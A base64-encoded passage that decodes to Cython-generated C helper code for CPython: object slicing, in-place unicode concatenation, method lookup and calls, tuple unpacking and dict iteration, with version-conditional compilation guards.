AgICAgICAgICAgICAgICAgcHlfc3RhcnQgPSBQeV9Ob25lO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgaWYgKF9weV9zdG9wKSB7XG4gICAgICAgICAgICAgICAgcHlfc3RvcCA9ICpfcHlfc3RvcDtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgaWYgKGhhc19jc3RvcCkge1xuICAgICAgICAgICAgICAgICAgICBvd25lZF9zdG9wID0gcHlfc3RvcCA9IFB5TG9uZ19Gcm9tU3NpemVfdChjc3RvcCk7XG4gICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghcHlfc3RvcCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIFB5X1hERUNSRUYob3duZWRfc3RhcnQpO1xuICAgICAgICAgICAgICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9IGVsc2VcbiAgICAgICAgICAgICAgICAgICAgcHlfc3RvcCA9IFB5X05vbmU7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBweV9zbGljZSA9IFB5U2xpY2VfTmV3KHB5X3N0YXJ0LCBweV9zdG9wLCBQeV9Ob25lKTtcbiAgICAgICAgICAgIFB5X1hERUNSRUYob3duZWRfc3RhcnQpO1xuICAgICAgICAgICAgUHlfWERFQ1JFRihvd25lZF9zdG9wKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghcHlfc2xpY2UpKSBnb3RvIGJhZDtcbiAgICAgICAgfVxuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgICAgICByZXN1bHQgPSBtcC0+bXBfc3Vic2NyaXB0KG9iaiwgcHlfc2xpY2UpO1xuI2Vsc2VcbiAgICAgICAgcmVzdWx0ID0gUHlPYmplY3RfR2V0SXRlbShvYmosIHB5X3NsaWNlKTtcbiNlbmRpZlxuICAgICAgICBpZiAoIV9weV9zbGljZSkge1xuICAgICAgICAgICAgUHlfREVDUkVGKHB5X3NsaWNlKTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiAgICBvYmpfdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeV9UWVBFKG9iaikpO1xuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICJcJyIgX19QeXhfRk1UX1RZUEVOQU1FICJcJyBvYmplY3QgaXMgdW5zbGljZWFibGUiLCBvYmpfdHlwZV9uYW1lKTtcbiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUob2JqX3R5cGVfbmFtZSk7XG5iYWQ6XG4gICAgcmV0dXJuIE5VTEw7XG59XG5cblxuIyBpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBpbnRcbl9fUHl4X3VuaWNvZGVfbW9kaWZpYWJsZShQeU9iamVjdCAqdW5pY29kZSwgaW50IHVuc2FmZV9zaGFyZWQpXG57XG4gICAgaWYgKCFfX1B5eF9JU19VTklRVUVMWV9SRUZFUkVOQ0VEKHVuaWNvZGUsIHVuc2FmZV9zaGFyZWQpKVxuICAgICAgICByZXR1cm4gMDtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPiAweDAzMEYwMDAwXG4gICAgaWYgKFB5VW5zdGFibGVfVW5pY29kZV9HRVRfQ0FDSEVEX0hBU0godW5pY29kZSkgIT0gLTEpXG4gICAgICAgIHJldHVybiAwO1xuI2VuZGlmXG4gICAgaWYgKCFQeVVuaWNvZGVfQ2hlY2tFeGFjdCh1bmljb2RlKSlcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgaWYgKFB5VW5pY29kZV9DSEVDS19JTlRFUk5FRCh1bmljb2RlKSlcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgcmV0dXJuIDE7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2VJbXBsKFB5T2JqZWN0ICoqcF9sZWZ0LCBQeU9iamVjdCAqcmlnaHQsIGludCB1bnNhZmVfc2hhcmVkXG4gICAgICAgICNpZiBDWVRIT05fUkVGTkFOTllcbiAgICAgICAgLCB2b2lkKiBfX3B5eF9yZWZuYW5ueVxuICAgICAgICAjZW5kaWZcbiAgICApIHtcbiAgICBQeU9iamVjdCAqbGVmdCA9ICpwX2xlZnQ7XG4gICAgUHlfc3NpemVfdCBsZWZ0X2xlbiwgcmlnaHRfbGVuLCBuZXdfbGVuO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9QeVVuaWNvZGVfUkVBRFkobGVmdCkgPT0gLTEpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlVbmljb2RlX1JFQURZKHJpZ2h0KSA9PSAtMSkpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIGxlZnRfbGVuID0gUHlVbmljb2RlX0dFVF9MRU5HVEgobGVmdCk7XG4gICAgaWYgKGxlZnRfbGVuID09IDApIHtcbiAgICAgICAgUHlfSU5DUkVGKHJpZ2h0KTtcbiAgICAgICAgcmV0dXJuIHJpZ2h0O1xuICAgIH1cbiAgICByaWdodF9sZW4gPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChyaWdodCk7XG4gICAgaWYgKHJpZ2h0X2xlbiA9PSAwKSB7XG4gICAgICAgIFB5X0lOQ1JFRihsZWZ0KTtcbiAgICAgICAgcmV0dXJuIGxlZnQ7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseShsZWZ0X2xlbiA+IFBZX1NTSVpFX1RfTUFYIC0gcmlnaHRfbGVuKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvcixcbiAgICAgICAgICAgICAgICAgICAgICAgICJzdHJpbmdzIGFyZSB0b28gbGFyZ2UgdG8gY29uY2F0Iik7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBuZXdfbGVuID0gbGVmdF9sZW4gKyByaWdodF9sZW47XG4gICAgaWYgKF9fUHl4X3VuaWNvZGVfbW9kaWZpYWJsZShsZWZ0LCB1bnNhZmVfc2hhcmVkKVxuICAgICAgICAgICAgJiYgUHlVbmljb2RlX0NoZWNrRXhhY3QocmlnaHQpXG4gICAgICAgICAgICAmJiBQeVVuaWNvZGVfS0lORChyaWdodCkgPD0gUHlVbmljb2RlX0tJTkQobGVmdClcbiAgICAgICAgICAgICYmICEoUHlVbmljb2RlX0lTX0FTQ0lJKGxlZnQpICYmICFQeVVuaWNvZGVfSVNfQVNDSUkocmlnaHQpKSkge1xuICAgICAgICBpbnQgcmV0O1xuICAgICAgICBfX1B5eF9HSVZFUkVGKCpwX2xlZnQpO1xuICAgICAgICByZXQgPSBQeVVuaWNvZGVfUmVzaXplKHBfbGVmdCwgbmV3X2xlbik7XG4gICAgICAgIF9fUHl4X0dPVFJFRigqcF9sZWZ0KTtcbiAgICAgICAgaWYgKHVubGlrZWx5KHJldCAhPSAwKSlcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgICAgICBpZiAodW5saWtlbHkoUHlVbmljb2RlX0NvcHlDaGFyYWN0ZXJzKCpwX2xlZnQsIGxlZnRfbGVuLCByaWdodCwgMCwgcmlnaHRfbGVuKSA8IDApKSByZXR1cm4gTlVMTDtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgX1B5VW5pY29kZV9GYXN0Q29weUNoYXJhY3RlcnMoKnBfbGVmdCwgbGVmdF9sZW4sIHJpZ2h0LCAwLCByaWdodF9sZW4pO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgX19QeXhfSU5DUkVGKCpwX2xlZnQpO1xuICAgICAgICBfX1B5eF9HSVZFUkVGKCpwX2xlZnQpO1xuICAgICAgICByZXR1cm4gKnBfbGVmdDtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXR1cm4gX19QeXhfUHlVbmljb2RlX0NvbmNhdChsZWZ0LCByaWdodCk7XG4gICAgfVxuICB9XG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE5vQXJnKFB5T2JqZWN0ICpmdW5jKSB7XG4gICAgUHlPYmplY3QgKmFyZ1syXSA9IHtOVUxMLCBOVUxMfTtcbiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoZnVuYywgYXJnICsgMSwgMCB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCk7XG59XG5cblxuI2lmICEoQ1lUSE9OX1ZFQ1RPUkNBTEwgJiYgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMCB8fCAoIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCkpKVxuc3RhdGljIGludCBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2QoUHlPYmplY3QgKm9iaiwgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICoqbWV0aG9kKSB7XG4gICAgUHlPYmplY3QgKmF0dHI7XG4jaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTICYmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVBcbiAgICBfX1B5eF9UeXBlTmFtZSB0eXBlX25hbWU7XG4gICAgUHlUeXBlT2JqZWN0ICp0cCA9IFB5X1RZUEUob2JqKTtcbiAgICBQeU9iamVjdCAqZGVzY3I7XG4gICAgZGVzY3JnZXRmdW5jIGYgPSBOVUxMO1xuICAgIFB5T2JqZWN0ICoqZGljdHB0ciwgKmRpY3Q7XG4gICAgaW50IG1ldGhfZm91bmQgPSAwO1xuICAgIGFzc2VydCAoKm1ldGhvZCA9PSBOVUxMKTtcbiAgICBpZiAodW5saWtlbHkodHAtPnRwX2dldGF0dHJvICE9IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyKSkge1xuICAgICAgICBhdHRyID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihvYmosIG5hbWUpO1xuICAgICAgICBnb3RvIHRyeV91bnBhY2s7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseSh0cC0+dHBfZGljdCA9PSBOVUxMKSAmJiB1bmxpa2VseShQeVR5cGVfUmVhZHkodHApIDwgMCkpIHtcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgfVxuICAgIGRlc2NyID0gX1B5VHlwZV9Mb29rdXAodHAsIG5hbWUpO1xuICAgIGlmIChsaWtlbHkoZGVzY3IgIT0gTlVMTCkpIHtcbiAgICAgICAgUHlfSU5DUkVGKGRlc2NyKTtcbiNpZiBkZWZpbmVkKFB5X1RQRkxBR1NfTUVUSE9EX0RFU0NSSVBUT1IpICYmIFB5X1RQRkxBR1NfTUVUSE9EX0RFU0NSSVBUT1JcbiAgICAgICAgaWYgKF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKFB5X1RZUEUoZGVzY3IpLCBQeV9UUEZMQUdTX01FVEhPRF9ERVNDUklQVE9SKSlcbiNlbHNlXG4gICAgICAgICNpZmRlZiBfX1B5eF9DeUZ1bmN0aW9uX1VTRURcbiAgICAgICAgaWYgKGxpa2VseShQeUZ1bmN0aW9uX0NoZWNrKGRlc2NyKSB8fCBfX1B5eF9JU19UWVBFKGRlc2NyLCAmUHlNZXRob2REZXNjcl9UeXBlKSB8fCBfX1B5eF9DeUZ1bmN0aW9uX0NoZWNrKGRlc2NyKSkpXG4gICAgICAgICNlbHNlXG4gICAgICAgIGlmIChsaWtlbHkoUHlGdW5jdGlvbl9DaGVjayhkZXNjcikgfHwgX19QeXhfSVNfVFlQRShkZXNjciwgJlB5TWV0aG9kRGVzY3JfVHlwZSkpKVxuICAgICAgICAjZW5kaWZcbiNlbmRpZlxuICAgICAgICB7XG4gICAgICAgICAgICBtZXRoX2ZvdW5kID0gMTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGYgPSBQeV9UWVBFKGRlc2NyKS0+dHBfZGVzY3JfZ2V0O1xuICAgICAgICAgICAgaWYgKGYgIT0gTlVMTCAmJiBQeURlc2NyX0lzRGF0YShkZXNjcikpIHtcbiAgICAgICAgICAgICAgICBhdHRyID0gZihkZXNjciwgb2JqLCAoUHlPYmplY3QgKilQeV9UWVBFKG9iaikpO1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihkZXNjcik7XG4gICAgICAgICAgICAgICAgZ290byB0cnlfdW5wYWNrO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgfVxuICAgIGRpY3RwdHIgPSBfUHlPYmplY3RfR2V0RGljdFB0cihvYmopO1xuICAgIGlmIChkaWN0cHRyICE9IE5VTEwgJiYgKGRpY3QgPSAqZGljdHB0cikgIT0gTlVMTCkge1xuICAgICAgICBQeV9JTkNSRUYoZGljdCk7XG4gICAgICAgIGF0dHIgPSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cihkaWN0LCBuYW1lKTtcbiAgICAgICAgaWYgKGF0dHIgIT0gTlVMTCkge1xuICAgICAgICAgICAgUHlfSU5DUkVGKGF0dHIpO1xuICAgICAgICAgICAgUHlfREVDUkVGKGRpY3QpO1xuICAgICAgICAgICAgUHlfWERFQ1JFRihkZXNjcik7XG4gICAgICAgICAgICBnb3RvIHRyeV91bnBhY2s7XG4gICAgICAgIH1cbiAgICAgICAgUHlfREVDUkVGKGRpY3QpO1xuICAgIH1cbiAgICBpZiAobWV0aF9mb3VuZCkge1xuICAgICAgICAqbWV0aG9kID0gZGVzY3I7XG4gICAgICAgIHJldHVybiAxO1xuICAgIH1cbiAgICBpZiAoZiAhPSBOVUxMKSB7XG4gICAgICAgIGF0dHIgPSBmKGRlc2NyLCBvYmosIChQeU9iamVjdCAqKVB5X1RZUEUob2JqKSk7XG4gICAgICAgIFB5X0RFQ1JFRihkZXNjcik7XG4gICAgICAgIGdvdG8gdHJ5X3VucGFjaztcbiAgICB9XG4gICAgaWYgKGxpa2VseShkZXNjciAhPSBOVUxMKSkge1xuICAgICAgICAqbWV0aG9kID0gZGVzY3I7XG4gICAgICAgIHJldHVybiAwO1xuICAgIH1cbiAgICB0eXBlX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKHRwKTtcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfQXR0cmlidXRlRXJyb3IsXG4gICAgICAgICAgICAgICAgICJcJyIgX19QeXhfRk1UX1RZUEVOQU1FICJcJyBvYmplY3QgaGFzIG5vIGF0dHJpYnV0ZSBcJyVVXCciLFxuICAgICAgICAgICAgICAgICB0eXBlX25hbWUsIG5hbWUpO1xuICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZSh0eXBlX25hbWUpO1xuICAgIHJldHVybiAwO1xuI2Vsc2VcbiAgICBhdHRyID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihvYmosIG5hbWUpO1xuICAgIGdvdG8gdHJ5X3VucGFjaztcbiNlbmRpZlxudHJ5X3VucGFjazpcbiNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICBpZiAobGlrZWx5KGF0dHIpICYmIFB5TWV0aG9kX0NoZWNrKGF0dHIpICYmIGxpa2VseShQeU1ldGhvZF9HRVRfU0VMRihhdHRyKSA9PSBvYmopKSB7XG4gICAgICAgIFB5T2JqZWN0ICpmdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihhdHRyKTtcbiAgICAgICAgUHlfSU5DUkVGKGZ1bmN0aW9uKTtcbiAgICAgICAgUHlfREVDUkVGKGF0dHIpO1xuICAgICAgICAqbWV0aG9kID0gZnVuY3Rpb247XG4gICAgICAgIHJldHVybiAxO1xuICAgIH1cbiNlbmRpZlxuICAgICptZXRob2QgPSBhdHRyO1xuICAgIHJldHVybiAwO1xufVxuI2VuZGlmXG5cblxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMChQeU9iamVjdCogb2JqLCBQeU9iamVjdCogbWV0aG9kX25hbWUpIHtcbiNpZiBDWVRIT05fVkVDVE9SQ0FMTCAmJiAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwIHx8ICghQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwKSlcbiAgICBQeU9iamVjdCAqYXJnc1sxXSA9IHtvYmp9O1xuICAgICh2b2lkKSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnO1xuICAgICh2b2lkKSBfX1B5eF9QeU9iamVjdF9DYWxsTm9Bcmc7XG4gICAgcmV0dXJuIFB5T2JqZWN0X1ZlY3RvcmNhbGxNZXRob2QobWV0aG9kX25hbWUsIGFyZ3MsIDEgfCBQWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQsIE5VTEwpO1xuI2Vsc2VcbiAgICBQeU9iamVjdCAqbWV0aG9kID0gTlVMTCwgKnJlc3VsdCA9IE5VTEw7XG4gICAgaW50IGlzX21ldGhvZCA9IF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZChvYmosIG1ldGhvZF9uYW1lLCAmbWV0aG9kKTtcbiAgICBpZiAobGlrZWx5KGlzX21ldGhvZCkpIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhtZXRob2QsIG9iaik7XG4gICAgICAgIFB5X0RFQ1JFRihtZXRob2QpO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoIW1ldGhvZCkpIGdvdG8gYmFkO1xuICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxOb0FyZyhtZXRob2QpO1xuICAgIFB5X0RFQ1JFRihtZXRob2QpO1xuYmFkOlxuICAgIHJldHVybiByZXN1bHQ7XG4jZW5kaWZcbn1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JhaXNlTm9uZU5vdEl0ZXJhYmxlRXJyb3Iodm9pZCkge1xuICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsICJcJ05vbmVUeXBlXCcgb2JqZWN0IGlzIG5vdCBpdGVyYWJsZSIpO1xufVxuXG5cbnN0YXRpYyB2b2lkIF9fUHl4X1VucGFja1R1cGxlRXJyb3IoUHlPYmplY3QgKnQsIFB5X3NzaXplX3QgaW5kZXgpIHtcbiAgICBpZiAodCA9PSBQeV9Ob25lKSB7XG4gICAgICBfX1B5eF9SYWlzZU5vbmVOb3RJdGVyYWJsZUVycm9yKCk7XG4gICAgfSBlbHNlIHtcbiAgICAgIFB5X3NzaXplX3Qgc2l6ZSA9IF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUodCk7XG4gI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgaWYgKHVubGlrZWx5KHNpemUgPCAwKSkgcmV0dXJuO1xuICNlbmRpZlxuICAgICAgaWYgKHNpemUgPCBpbmRleCkge1xuICAgICAgICBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3Ioc2l6ZSk7XG4gICAgICB9IGVsc2Uge1xuICAgICAgICBfX1B5eF9SYWlzZVRvb01hbnlWYWx1ZXNFcnJvcihpbmRleCk7XG4gICAgICB9XG4gICAgfVxufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF91bnBhY2tfdHVwbGUyKFxuICAgICAgICBQeU9iamVjdCogdHVwbGUsIFB5T2JqZWN0KiogdmFsdWUxLCBQeU9iamVjdCoqIHZhbHVlMiwgaW50IGlzX3R1cGxlLCBpbnQgaGFzX2tub3duX3NpemUsIGludCBkZWNyZWZfdHVwbGUpIHtcbiAgICBpZiAobGlrZWx5KGlzX3R1cGxlIHx8IFB5VHVwbGVfQ2hlY2sodHVwbGUpKSkge1xuICAgICAgICBQeV9zc2l6ZV90IHNpemU7XG4gICAgICAgIGlmIChoYXNfa25vd25fc2l6ZSkge1xuICAgICAgICAgICAgcmV0dXJuIF9fUHl4X3VucGFja190dXBsZTJfZXhhY3QodHVwbGUsIHZhbHVlMSwgdmFsdWUyLCBkZWNyZWZfdHVwbGUpO1xuICAgICAgICB9XG4gICAgICAgIHNpemUgPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKHR1cGxlKTtcbiAgICAgICAgaWYgKGxpa2VseShzaXplID09IDIpKSB7XG4gICAgICAgICAgICByZXR1cm4gX19QeXhfdW5wYWNrX3R1cGxlMl9leGFjdCh0dXBsZSwgdmFsdWUxLCB2YWx1ZTIsIGRlY3JlZl90dXBsZSk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKHNpemUgPj0gMCkge1xuICAgICAgICAgICAgX19QeXhfVW5wYWNrVHVwbGVFcnJvcih0dXBsZSwgMik7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHJldHVybiBfX1B5eF91bnBhY2tfdHVwbGUyX2dlbmVyaWModHVwbGUsIHZhbHVlMSwgdmFsdWUyLCBoYXNfa25vd25fc2l6ZSwgZGVjcmVmX3R1cGxlKTtcbiAgICB9XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfdW5wYWNrX3R1cGxlMl9leGFjdChcbiAgICAgICAgUHlPYmplY3QqIHR1cGxlLCBQeU9iamVjdCoqIHB2YWx1ZTEsIFB5T2JqZWN0KiogcHZhbHVlMiwgaW50IGRlY3JlZl90dXBsZSkge1xuICAgIFB5T2JqZWN0ICp2YWx1ZTEgPSBOVUxMLCAqdmFsdWUyID0gTlVMTDtcbiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyB8fCAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgIHZhbHVlMSA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTSh0dXBsZSwgMCk7ICBpZiAodW5saWtlbHkoIXZhbHVlMSkpIGdvdG8gYmFkO1xuICAgIHZhbHVlMiA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTSh0dXBsZSwgMSk7ICBpZiAodW5saWtlbHkoIXZhbHVlMikpIGdvdG8gYmFkO1xuI2Vsc2VcbiAgICB2YWx1ZTEgPSBQeVR1cGxlX0dFVF9JVEVNKHR1cGxlLCAwKTsgIFB5X0lOQ1JFRih2YWx1ZTEpO1xuICAgIHZhbHVlMiA9IFB5VHVwbGVfR0VUX0lURU0odHVwbGUsIDEpOyAgUHlfSU5DUkVGKHZhbHVlMik7XG4jZW5kaWZcbiAgICBpZiAoZGVjcmVmX3R1cGxlKSB7XG4gICAgICAgIFB5X0RFQ1JFRih0dXBsZSk7XG4gICAgfVxuICAgICpwdmFsdWUxID0gdmFsdWUxO1xuICAgICpwdmFsdWUyID0gdmFsdWUyO1xuICAgIHJldHVybiAwO1xuI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIHx8ICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG5iYWQ6XG4gICAgUHlfWERFQ1JFRih2YWx1ZTEpO1xuICAgIFB5X1hERUNSRUYodmFsdWUyKTtcbiAgICBpZiAoZGVjcmVmX3R1cGxlKSB7IFB5X1hERUNSRUYodHVwbGUpOyB9XG4gICAgcmV0dXJuIC0xO1xuI2VuZGlmXG59XG5zdGF0aWMgaW50IF9fUHl4X3VucGFja190dXBsZTJfZ2VuZXJpYyhQeU9iamVjdCogdHVwbGUsIFB5T2JqZWN0KiogcHZhbHVlMSwgUHlPYmplY3QqKiBwdmFsdWUyLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGhhc19rbm93bl9zaXplLCBpbnQgZGVjcmVmX3R1cGxlKSB7XG4gICAgUHlfc3NpemVfdCBpbmRleDtcbiAgICBQeU9iamVjdCAqdmFsdWUxID0gTlVMTCwgKnZhbHVlMiA9IE5VTEwsICppdGVyID0gTlVMTDtcbiAgICBpdGVybmV4dGZ1bmMgaXRlcm5leHQ7XG4gICAgaXRlciA9IFB5T2JqZWN0X0dldEl0ZXIodHVwbGUpO1xuICAgIGlmICh1bmxpa2VseSghaXRlcikpIGdvdG8gYmFkO1xuICAgIGlmIChkZWNyZWZfdHVwbGUpIHsgUHlfREVDUkVGKHR1cGxlKTsgdHVwbGUgPSBOVUxMOyB9XG4gICAgaXRlcm5leHQgPSBfX1B5eF9QeU9iamVjdF9HZXRJdGVyTmV4dEZ1bmMoaXRlcik7XG4gICAgdmFsdWUxID0gaXRlcm5leHQoaXRlcik7IGlmICh1bmxpa2VseSghdmFsdWUxKSkgeyBpbmRleCA9IDA7IGdvdG8gdW5wYWNraW5nX2ZhaWxlZDsgfVxuICAgIHZhbHVlMiA9IGl0ZXJuZXh0KGl0ZXIpOyBpZiAodW5saWtlbHkoIXZhbHVlMikpIHsgaW5kZXggPSAxOyBnb3RvIHVucGFja2luZ19mYWlsZWQ7IH1cbiAgICBpZiAoIWhhc19rbm93bl9zaXplICYmIHVubGlrZWx5KF9fUHl4X0l0ZXJuZXh0VW5wYWNrRW5kQ2hlY2soaXRlcm5leHQoaXRlciksIDIpKSkgZ290byBiYWQ7XG4gICAgUHlfREVDUkVGKGl0ZXIpO1xuICAgICpwdmFsdWUxID0gdmFsdWUxO1xuICAgICpwdmFsdWUyID0gdmFsdWUyO1xuICAgIHJldHVybiAwO1xudW5wYWNraW5nX2ZhaWxlZDpcbiAgICBpZiAoIWhhc19rbm93bl9zaXplICYmIF9fUHl4X0l0ZXJGaW5pc2goKSA9PSAwKVxuICAgICAgICBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3IoaW5kZXgpO1xuYmFkOlxuICAgIFB5X1hERUNSRUYoaXRlcik7XG4gICAgUHlfWERFQ1JFRih2YWx1ZTEpO1xuICAgIFB5X1hERUNSRUYodmFsdWUyKTtcbiAgICBpZiAoZGVjcmVmX3R1cGxlKSB7IFB5X1hERUNSRUYodHVwbGUpOyB9XG4gICAgcmV0dXJuIC0xO1xufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiNpbmNsdWRlIDxzdHJpbmcuaD5cbiNlbmRpZlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X2RpY3RfaXRlcmF0b3IoUHlPYmplY3QqIGl0ZXJhYmxlLCBpbnQgaXNfZGljdCwgUHlPYmplY3QqIG1ldGhvZF9uYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlfc3NpemVfdCogcF9vcmlnX2xlbmd0aCwgaW50KiBwX3NvdXJjZV9pc19kaWN0KSB7XG4gICAgaXNfZGljdCA9IGlzX2RpY3QgfHwgbGlrZWx5KFB5RGljdF9DaGVja0V4YWN0KGl0ZXJhYmxlKSk7XG4gICAgKnBfc291cmNlX2lzX2RpY3QgPSBpc19kaWN0O1xuICAgIGlmIChpc19kaWN0KSB7XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAgICAgICAqcF9vcmlnX2xlbmd0aCA9IFB5RGljdF9TaXplKGl0ZXJhYmxlKTtcbiAgICAgICAgUHlfSU5DUkVGKGl0ZXJhYmxlKTtcbiAgICAgICAgcmV0dXJuIGl0ZXJhYmxlO1xuI2Vsc2VcbiAgICAgICAgc3RhdGljIFB5T2JqZWN0ICpweV9pdGVtcyA9IE5VTEwsICpweV9rZXlzID0gTlVMTCwgKnB5X3ZhbHVlcyA9IE5VTEw7XG4gICAgICAgIFB5T2JqZWN0ICoqcHAgPSBOVUxMO1xuICAgICAgICBpZiAobWV0aG9kX25hbWUpIHtcbiAgICAgICAgICAgIGNvbnN0IGNoYXIgKm5hbWUgPSBQeVVuaWNvZGVfQXNVVEY4KG1ldGhvZF9uYW1lKTtcbiAgICAgICAgICAgIGlmIChzdHJjbXAobmFtZSwgIml0ZXJpdGVtcyIpID09IDApIHBwID0gJnB5X2l0ZW1zO1xuICAgICAgICAgICAgZWxzZSBpZiAoc3RyY21wKG5hbWUsICJpdGVya2V5cyIpID09IDApIHBwID0gJnB5X2tleXM7XG4gICAgICAgICAgICBlbHNlIGlmIChzdHJjbXAobmFtZSwgIml0ZXJ2YWx1ZXMiKSA9PSAwKSBwcCA9ICZweV92YWx1ZXM7XG4gICAgICAgICAgICBpZiAocHApIHtcbiAgICAgICAgICAgICAgICBpZiAoISpwcCkge1xuICAgICAgICAgICAgICAgICAgICAqcHAgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhuYW1lICsgNCk7XG4gICAgICAgICAgICAgICAgICAgIGlmICghKnBwKVxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIG1ldGhvZF9uYW1lID0gKnBwO1xuICAgICAgICAgICAgfVxuICAgICAgI